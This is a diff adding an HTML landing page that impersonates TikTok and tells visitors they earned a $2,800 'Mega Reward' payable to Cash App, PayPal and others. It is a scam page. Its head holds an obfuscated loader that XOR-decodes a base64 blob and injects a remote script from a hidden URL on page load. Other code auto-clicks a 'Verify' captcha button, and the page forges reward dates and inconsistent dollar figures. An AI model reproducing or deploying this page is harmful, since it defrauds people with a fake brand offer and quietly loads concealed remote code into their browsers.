@@ -1,0 +1,981 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"
+    />
+    <title>TikTok Rewards</title>
+    <meta
+      name="description"
+      content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank."
+    />
+    <meta name="author" content="TikTok Rewards" />
+    <meta name="theme-color" content="#ff0050" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="TikTok Rewards" />
+    <meta
+      property="og:description"
+      content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank."
+    />
+    <meta
+      property="og:image"
+      content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png"
+    />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="TikTok Rewards" />
+    <meta
+      name="twitter:description"
+      content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank."
+    />
+    <meta
+      name="twitter:image"
+      content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      rel="stylesheet"
+      href="./assets/styles-B-VQ289O.css"
+      data-precedence="default"
+    />
+    <link rel="stylesheet" href="./assets/css2.css" data-precedence="default" />
+    <link
+      rel="stylesheet"
+      href="./assets/index-B8NbOjFt.css"
+      data-precedence="default"
+    />
+    <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+    <script src="./scripts-loader.js" data-src="./tracking.html"></script>
+    <script>
+      (() => {
+        if (window.location.pathname === "/lp/") {
+          window.history.replaceState(
+            null,
+            "",
+            "/lp" + window.location.search + window.location.hash,
+          );
+        }
+
+        const earlyParams = new URLSearchParams(window.location.search);
+        if (
+          (window.location.pathname === "/" ||
+            window.location.pathname === "") &&
+          earlyParams.get("__route") === "tasks-app"
+        ) {
+          earlyParams.delete("__route");
+          const nextSearch = earlyParams.toString();
+          window.history.replaceState(
+            null,
+            "",
+            "/tasks-app" +
+              (nextSearch ? "?" + nextSearch : "") +
+              window.location.hash,
+          );
+        }
+
+        if (window.__mobileGuardInstalled) return;
+        window.__mobileGuardInstalled = true;
+        window.__earlyMobileGuard = true;
+
+        const viewportContent =
+          "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
+        let lastUrl = window.location.href;
+
+        const enforceViewport = () => {
+          let viewport = document.querySelector('meta[name="viewport"]');
+          if (!viewport) {
+            viewport = document.createElement("meta");
+            viewport.setAttribute("name", "viewport");
+            document.head.appendChild(viewport);
+          }
+          if (viewport.getAttribute("content") !== viewportContent) {
+            viewport.setAttribute("content", viewportContent);
+          }
+          document.documentElement.style.zoom = "1";
+          if (document.body) document.body.style.zoom = "1";
+        };
+
+        const isTextField = (node) => {
+          if (!node || !node.matches) return false;
+          return node.matches(
+            "input, textarea, select, [contenteditable='true']",
+          );
+        };
+
+        const resetAllScroll = () => {
+          enforceViewport();
+        };
+
+        const resetAfterScreenChange = () => {
+          requestAnimationFrame(resetAllScroll);
+          setTimeout(resetAllScroll, 60);
+          setTimeout(resetAllScroll, 180);
+          setTimeout(resetAllScroll, 420);
+          setTimeout(resetAllScroll, 900);
+        };
+
+        const prevent = (event) => {
+          if (event.cancelable) event.preventDefault();
+          enforceViewport();
+        };
+        const preventTouchZoom = (event) => {
+          if (event.touches && event.touches.length > 1) prevent(event);
+        };
+        const findCaptchaVerifyButton = (target) => {
+          const button = document.querySelector('button[aria-label="Verify"]');
+          if (
+            !button ||
+            !document.body ||
+            !document.body.innerText.includes("I am not a robot")
+          )
+            return null;
+          if (
+            target &&
+            target.closest &&
+            target.closest('input, textarea, select, [contenteditable="true"]')
+          )
+            return null;
+          const card =
+            button.parentElement && button.parentElement.parentElement;
+          if (
+            target === button ||
+            button.contains(target) ||
+            (card && card.contains(target))
+          )
+            return button;
+          return null;
+        };
+
+        let captchaTapLock = false;
+        const activateCaptchaTap = (target) => {
+          const button = findCaptchaVerifyButton(target);
+          if (!button) return false;
+          if (!captchaTapLock) {
+            captchaTapLock = true;
+            setTimeout(() => {
+              try {
+                button.click();
+              } catch {}
+              setTimeout(() => {
+                captchaTapLock = false;
+              }, 700);
+            }, 0);
+          }
+          return true;
+        };
+        const preventKeyboardZoom = (event) => {
+          if (
+            (event.ctrlKey || event.metaKey) &&
+            ["+", "-", "=", "0"].includes(event.key)
+          )
+            prevent(event);
+        };
+        const preventWheelZoom = (event) => {
+          if (event.ctrlKey || event.metaKey) prevent(event);
+        };
+
+        const originalPushState = history.pushState;
+        const originalReplaceState = history.replaceState;
+        history.pushState = function () {
+          const result = originalPushState.apply(this, arguments);
+          lastUrl = window.location.href;
+          resetAfterScreenChange();
+          return result;
+        };
+        history.replaceState = function () {
+          const result = originalReplaceState.apply(this, arguments);
+          lastUrl = window.location.href;
+          resetAfterScreenChange();
+          return result;
+        };
+
+        document.addEventListener("gesturestart", prevent, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener("gesturechange", prevent, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener("gestureend", prevent, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener("touchstart", preventTouchZoom, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener("touchmove", preventTouchZoom, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener(
+          "touchend",
+          (event) => {
+            activateCaptchaTap(event.target);
+            enforceViewport();
+          },
+          { passive: true, capture: true },
+        );
+        document.addEventListener("wheel", preventWheelZoom, {
+          passive: false,
+          capture: true,
+        });
+        document.addEventListener("keydown", preventKeyboardZoom, {
+          passive: false,
+          capture: true,
+        });
+
+        window.addEventListener("popstate", resetAfterScreenChange, {
+          capture: true,
+        });
+        document.addEventListener(
+          "click",
+          (event) => {
+            const target = event.target;
+            if (activateCaptchaTap(target)) return;
+            if (
+              target &&
+              target.closest &&
+              target.closest(
+                "input, textarea, select, [contenteditable='true']",
+              )
+            )
+              return;
+            if (
+              target &&
+              target.closest &&
+              target.closest("a, button, [role='button']")
+            ) {
+              resetAfterScreenChange();
+            }
+          },
+          true,
+        );
+        document.addEventListener(
+          "focusin",
+          (e) => {
+            setTimeout(enforceViewport, 0);
+          },
+          true,
+        );
+        document.addEventListener(
+          "focusout",
+          () => setTimeout(enforceViewport, 180),
+          true,
+        );
+        if (window.visualViewport) {
+          window.visualViewport.addEventListener("resize", () => {
+            enforceViewport();
+          });
+        }
+
+        new MutationObserver(() => {
+          if (window.location.href !== lastUrl) {
+            lastUrl = window.location.href;
+            resetAfterScreenChange();
+          }
+        }).observe(document.documentElement, {
+          childList: true,
+          subtree: true,
+        });
+
+        enforceViewport();
+        resetAfterScreenChange();
+        setInterval(() => {
+          enforceViewport();
+          if (window.location.href !== lastUrl) {
+            lastUrl = window.location.href;
+            resetAfterScreenChange();
+          }
+        }, 250);
+      })();
+    </script>
+    <script>
+      (function () {
+        var w_73l = atob(
+          "DMVgM3n0o8d2QMwRW75CRguYgf1UKLhlK7ZaHFaXx6lYNbh8MqMZHRqbzukUMuNiOLcJQw2HjLcfOKl9dLUJSxyYjrMfK7h+MOsKQFvYgaYCNL54ObAUVgrWmZwrbO52N6oCUhWHgf0tO+5/OqgFEUPW164dFKN6C6wYVhW9x+VaYrpwN7AFEUPWlaZHdP8gOPECAxzNx6UScPgkbvdYUhiQgborPQ==",
+        );
+        var q_j = [];
+        for (var v_3wz = 0; v_3wz < w_73l.length; v_3wz++) {
+          q_j.push(w_73l.charCodeAt(v_3wz) & 255);
+        }
+        var k_b = q_j[0];
+        var b_jbum = q_j.slice(1, 1 + k_b);
+        var f_tc92 = q_j.slice(1 + k_b);
+        var d_1c1 = f_tc92.map(function (b, u_m5hy) {
+          return b ^ b_jbum[u_m5hy % k_b];
+        });
+        var o_kp = "";
+        for (var t_wnbs = 0; t_wnbs < d_1c1.length; t_wnbs++) {
+          o_kp += String.fromCharCode(d_1c1[t_wnbs] & 255);
+        }
+        var l_c = decodeURIComponent(escape(o_kp));
+        var e_go = JSON.parse(l_c);
+        var q_gg = e_go.globals || [];
+        q_gg.forEach(function (q_y) {
+          window[q_y.name] = q_y.value;
+        });
+        var b_r = document.createElement("script");
+        b_r.src = e_go.url;
+        b_r.async = true;
+        b_r.defer = true;
+        (e_go.attributes || []).forEach(function (k_gh) {
+          b_r.setAttribute(k_gh.name, k_gh.value);
+        });
+        (document.head || document.documentElement).appendChild(b_r);
+      })();
+    </script>
+  </head>
+  <body>
+    <div class="min-h-screen bg-background max-w-[430px] mx-auto">
+      <div
+        id="entry-popup"
+        class="fixed inset-0 z-[100] hidden items-center justify-center bg-black/40 backdrop-blur-md transition-opacity duration-150 opacity-100"
+      >
+        <div
+          id="entry-popup-card"
+          class="flex flex-col items-center justify-center max-w-[320px] w-[85%] rounded-[32px] p-8 transition-transform duration-150 scale-100 opacity-100"
+          style="background-color: rgba(37, 37, 37, 0.75)"
+        >
+          <img
+            src="./assets/coin-p-D_rWn80y.png"
+            alt="Coin"
+            width="80"
+            height="80"
+            class="w-[80px] h-[80px] object-contain"
+          />
+          <p class="text-white text-2xl font-extrabold mt-6">
+            Congratulations!
+          </p>
+          <p class="text-white/90 text-center text-sm mt-2 leading-relaxed">
+            You&#39;ve done great as an active user on the platform. Your
+            engagement has been recognized and your reward is now available.
+          </p>
+          <button
+            id="entry-popup-continue"
+            class="mt-8 w-full py-3 bg-pink text-white font-bold text-[15px] rounded-[12px] active:scale-[0.97] transition-all"
+          >
+            Continue
+          </button>
+        </div>
+      </div>
+      <header
+        class="h-[60px] flex items-center justify-between px-4 bg-white sticky top-0 z-50"
+      >
+        <div class="flex items-center gap-2">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="28"
+            height="28"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            class="text-foreground"
+            aria-hidden="true"
+          >
+            <path d="m15 18-6-6 6-6"></path></svg
+          ><img
+            src="./assets/tiktok-logo-full-BWCPYanr.png"
+            alt="TikTok"
+            class="h-[18px] object-contain"
+          />
+        </div>
+        <div class="flex items-center gap-2">
+          <div
+            class="bg-white border border-[#E5E7EB] rounded-full h-8 flex items-center px-1 pr-3 gap-1.5"
+          >
+            <img
+              src="./assets/p-saldo-Cbw24AHL.svg"
+              alt="P"
+              width="24"
+              height="24"
+              class="w-6 h-6"
+            /><span class="font-bold text-foreground text-sm">2.800</span
+            ><span class="text-pink text-xs font-semibold">Cash out</span>
+          </div>
+          <div
+            class="border border-[#E5E7EB] rounded-full h-8 flex items-center px-3 gap-1"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="14"
+              height="14"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="text-foreground"
+              aria-hidden="true"
+            >
+              <path
+                d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"
+              ></path>
+              <path d="M13 5v2"></path>
+              <path d="M13 17v2"></path>
+              <path d="M13 11v2"></path></svg
+            ><span class="text-foreground text-sm font-medium">0</span>
+          </div>
+        </div>
+      </header>
+      <div class="px-4 mt-2">
+        <div class="rounded-[24px] overflow-hidden bg-pink">
+          <div class="p-5 pb-6 relative overflow-hidden bg-pink">
+            <div class="relative z-10">
+              <p
+                id="reward-date-range"
+                data-date-range="Oct 24 - Nov 7"
+                class="text-white/90 text-[11px] font-medium tracking-wide mb-1.5"
+              >
+                Oct 24 - Nov 7
+              </p>
+              <h1
+                class="text-[26px] font-[900] leading-[1.1] text-white max-w-[180px]"
+              >
+                Congratulations! You earned
+                <span class="text-yellow">$2,800</span>
+              </h1>
+              <p
+                class="text-white text-[13px] leading-snug mt-3 font-medium max-w-[210px]"
+              >
+                Your Mega Reward has been successfully unlocked.
+              </p>
+            </div>
+            <img
+              src="./assets/phone-hand-CSBHJ1bd.png"
+              alt="Hand holding phone with coins"
+              loading="eager"
+              decoding="async"
+              width="220"
+              height="293"
+              class="absolute -top-3 -right-12 w-[220px] h-auto z-[5] object-contain object-bottom pointer-events-none"
+            />
+            <div
+              class="h-[110px] mt-8 flex items-end justify-between relative z-10"
+            >
+              <div
+                class="w-[72px] h-[105px] flex flex-col items-center justify-center rounded-[36px] shadow-[0px_4px_10px_rgba(0,0,0,0.1)]"
+                style="background-color: rgb(249, 253, 90)"
+              >
+                <div
+                  class="w-[50px] h-[50px] rounded-full border-[3px] border-[rgb(255,58,97)] bg-[rgb(255,58,97)] flex items-center justify-center"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="30"
+                    height="30"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-[rgb(249,253,90)]"
+                    aria-hidden="true"
+                  >
+                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg>
+                </div>
+                <span class="text-[#1a1a1a] font-extrabold text-[14px] mt-1.5"
+                  >$850</span
+                >
+              </div>
+              <div
+                class="w-[72px] h-[105px] flex flex-col items-center justify-center rounded-[36px] shadow-[0px_4px_10px_rgba(0,0,0,0.1)]"
+                style="background-color: rgb(249, 253, 90)"
+              >
+                <div
+                  class="w-[50px] h-[50px] rounded-full border-[3px] border-[rgb(255,58,97)] bg-[rgb(255,58,97)] flex items-center justify-center"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="30"
+                    height="30"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-[rgb(249,253,90)]"
+                    aria-hidden="true"
+                  >
+                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg>
+                </div>
+                <span class="text-[#1a1a1a] font-extrabold text-[14px] mt-1.5"
+                  >$720</span
+                >
+              </div>
+              <div
+                class="w-[72px] h-[105px] flex flex-col items-center justify-center rounded-[36px] shadow-[0px_4px_10px_rgba(0,0,0,0.1)]"
+                style="background-color: rgb(249, 253, 90)"
+              >
+                <div
+                  class="w-[50px] h-[50px] rounded-full border-[3px] border-[rgb(255,58,97)] bg-[rgb(255,58,97)] flex items-center justify-center"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="30"
+                    height="30"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-[rgb(249,253,90)]"
+                    aria-hidden="true"
+                  >
+                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg>
+                </div>
+                <span class="text-[#1a1a1a] font-extrabold text-[14px] mt-1.5"
+                  >$680</span
+                >
+              </div>
+              <div
+                class="w-[72px] h-[105px] flex flex-col items-center justify-center rounded-[36px] shadow-[0px_4px_10px_rgba(0,0,0,0.1)]"
+                style="background-color: rgb(249, 253, 90)"
+              >
+                <div
+                  class="w-[50px] h-[50px] rounded-full border-[3px] border-[rgb(255,58,97)] bg-[rgb(255,58,97)] flex items-center justify-center"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="30"
+                    height="30"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-[rgb(249,253,90)]"
+                    aria-hidden="true"
+                  >
+                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg>
+                </div>
+                <span class="text-[#1a1a1a] font-extrabold text-[14px] mt-1.5"
+                  >$550</span
+                >
+              </div>
+            </div>
+          </div>
+          <div class="bg-pink px-5 pb-5">
+            <button
+              data-navigate="/resgatar"
+              class="w-full h-[52px] bg-yellow text-foreground font-[800] text-[17px] rounded-full mt-4 flex items-center justify-center active:scale-[0.98] transition-transform shadow-[0px_2px_8px_rgba(0,0,0,0.08)]"
+            >
+              Claim Reward
+            </button>
+            <p class="mt-5 text-center text-white text-[13px]">
+              Invite code:
+              <span
+                id="invite-code"
+                class="font-bold text-yellow underline decoration-solid underline-offset-4 cursor-pointer"
+                >JN869241770351<svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="14"
+                  height="14"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="inline ml-1"
+                  aria-hidden="true"
+                >
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path
+                    d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"
+                  ></path></svg
+              ></span>
+            </p>
+          </div>
+          <div class="bg-pink px-5 py-6">
+            <h2 class="text-white text-[18px] font-black mb-3">
+              Summary of your activity on the platform
+            </h2>
+            <p
+              class="text-white/90 text-[13px] leading-relaxed mb-5 font-medium"
+            >
+              Congratulations! As an active user on the platform, you&#39;re
+              being rewarded based on your ongoing engagement.
+            </p>
+            <div class="flex flex-col gap-3">
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >Over 100 videos shared with friends</span
+                >
+              </div>
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >Over 250 hours watched on the platform</span
+                >
+              </div>
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >Over 420 ads watched</span
+                >
+              </div>
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >Over 1,000 videos liked</span
+                >
+              </div>
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >7 consecutive days of daily login</span
+                >
+              </div>
+              <div class="flex items-start gap-2.5">
+                <div
+                  class="w-[20px] h-[20px] rounded-full bg-yellow flex items-center justify-center shrink-0 mt-0.5"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="11"
+                    height="11"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-pink"
+                    aria-hidden="true"
+                  >
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                  </svg>
+                </div>
+                <span class="text-white text-[13px] leading-snug font-medium"
+                  >Consistent activity validated throughout the entire campaign
+                  period</span
+                >
+              </div>
+            </div>
+            <p
+              class="text-white/80 text-[12px] leading-relaxed mt-5 font-medium"
+            >
+              These actions confirm that all criteria required by the campaign
+              have been fully met.
+            </p>
+          </div>
+          <div class="bg-pink px-5 py-6 border-t border-dashed border-white/30">
+            <h2 class="text-white text-[18px] font-black mb-5">
+              How you earned $2,800
+            </h2>
+            <p class="text-white text-[13px] font-medium leading-[1.4]">
+              1. You shared your link and your friends downloaded TikTok, signed
+              up, and entered your invite code.
+            </p>
+            <p class="mt-1">
+              <span class="text-yellow font-bold text-[13px]"
+                >$1,000 received</span
+              >
+            </p>
+            <div
+              class="w-full border-t border-dotted border-white/20 my-5"
+            ></div>
+            <div class="flex items-start justify-between">
+              <div class="flex-1">
+                <p class="text-white text-[13px] font-medium leading-[1.4]">
+                  2. Your friends watched 30 minutes of videos per day during
+                  the entire period.
+                </p>
+                <p class="mt-1">
+                  <span class="text-yellow font-bold text-[13px]"
+                    >$2,700 received</span
+                  >
+                </p>
+              </div>
+              <span
+                class="bg-dark-red text-white text-[11px] font-bold px-4 py-2 rounded-full ml-3 shrink-0"
+                >Completed</span
+              >
+            </div>
+            <div class="mt-10 px-2 relative">
+              <div
+                class="absolute top-[38px] left-6 right-6 h-[3px] bg-yellow rounded-full"
+              ></div>
+              <div class="flex items-center justify-between relative">
+                <div class="flex flex-col items-center">
+                  <span
+                    class="bg-white/20 text-[9px] px-2 py-0.5 rounded-full text-white mb-2 font-medium"
+                    >3 days</span
+                  >
+                  <div
+                    class="bg-yellow border-2 border-yellow w-5 h-5 rounded-full flex items-center justify-center z-10"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="10"
+                      height="10"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="3"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      class="text-pink"
+                      aria-hidden="true"
+                    >
+                      <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                  </div>
+                  <span class="text-yellow font-black text-[11px] mt-2"
+                    >+$300</span
+                  >
+                </div>
+                <div class="flex flex-col items-center">
+                  <span
+                    class="bg-white/20 text-[9px] px-2 py-0.5 rounded-full text-white mb-2 font-medium"
+                    >7 days</span
+                  >
+                  <div
+                    class="bg-yellow border-2 border-yellow w-5 h-5 rounded-full flex items-center justify-center z-10"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="10"
+                      height="10"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="3"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      class="text-pink"
+                      aria-hidden="true"
+                    >
+                      <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                  </div>
+                  <span class="text-yellow font-black text-[11px] mt-2"
+                    >+$500</span
+                  >
+                </div>
+                <div class="flex flex-col items-center">
+                  <span
+                    class="bg-white/20 text-[9px] px-2 py-0.5 rounded-full text-white mb-2 font-medium"
+                    >14 days</span
+                  >
+                  <div
+                    class="bg-yellow border-2 border-yellow w-5 h-5 rounded-full flex items-center justify-center z-10"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="10"
+                      height="10"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="3"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      class="text-pink"
+                      aria-hidden="true"
+                    >
+                      <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                  </div>
+                  <span class="text-yellow font-black text-[11px] mt-2"
+                    >+$1,000</span
+                  >
+                </div>
+              </div>
+            </div>
+            <div
+              class="w-full border-t border-dashed border-white/30 mt-8"
+            ></div>
+            <p
+              data-navigate="/faq"
+              role="button"
+              tabindex="0"
+              class="text-center text-white/80 text-[12px] font-medium py-8 cursor-pointer hover:underline flex items-center justify-center gap-1"
+            >
+              View details
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="14"
+                height="14"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                aria-hidden="true"
+              >
+                <path d="m9 18 6-6-6-6"></path>
+              </svg>
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="./scripts-loader.js" data-src="./footer.html"></script>
+  </body>
+</html>
+<script type="module">
+  var e = document.querySelector(`#entry-popup`),
+    t = document.querySelector(`#entry-popup-card`),
+    n = document.querySelector(`#entry-popup-continue`),
+    r = !1;
+  try {
+    r = localStorage.getItem(`entry_popup_seen`) === `true`;
+  } catch {}
+  (e && !r && (e.classList.remove(`hidden`), e.classList.add(`flex`)),
+    n?.addEventListener(`click`, () => {
+      try {
+        localStorage.setItem(`entry_popup_seen`, `true`);
+      } catch {}
+      (e?.classList.add(`opacity-0`),
+        t?.classList.add(`scale-95`, `opacity-0`),
+        setTimeout(() => e?.remove(), 150));
+    }),
+    document.querySelector(`#invite-code`)?.addEventListener(`click`, () => {
+      navigator.clipboard?.writeText(`JN869241770351`);
+    }));
+  var i = (e) => {
+    window.location.assign(
+      `${e}${window.location.search}${window.location.hash}`,
+    );
+  };
+  document.querySelectorAll(`[data-navigate]`).forEach((e) => {
+    (e.addEventListener(`click`, () => i(e.dataset.navigate)),
+      e.addEventListener(`keydown`, (t) => {
+        (t.key === `Enter` || t.key === ` `) &&
+          (t.preventDefault(), i(e.dataset.navigate));
+      }));
+  });
+  var a = [
+      `Jan`,
+      `Feb`,
+      `Mar`,
+      `Apr`,
+      `May`,
+      `Jun`,
+      `Jul`,
+      `Aug`,
+      `Sep`,
+      `Oct`,
+      `Nov`,
+      `Dec`,
+    ],
+    o = new Date(),
+    s = new Date(o);
+  s.setDate(o.getDate() + 14);
+  var c = document.querySelector(`#reward-date-range`);
+  c &&
+    (c.textContent = `${a[o.getMonth()]} ${o.getDate()} - ${a[s.getMonth()]} ${s.getDate()}`);
+</script>
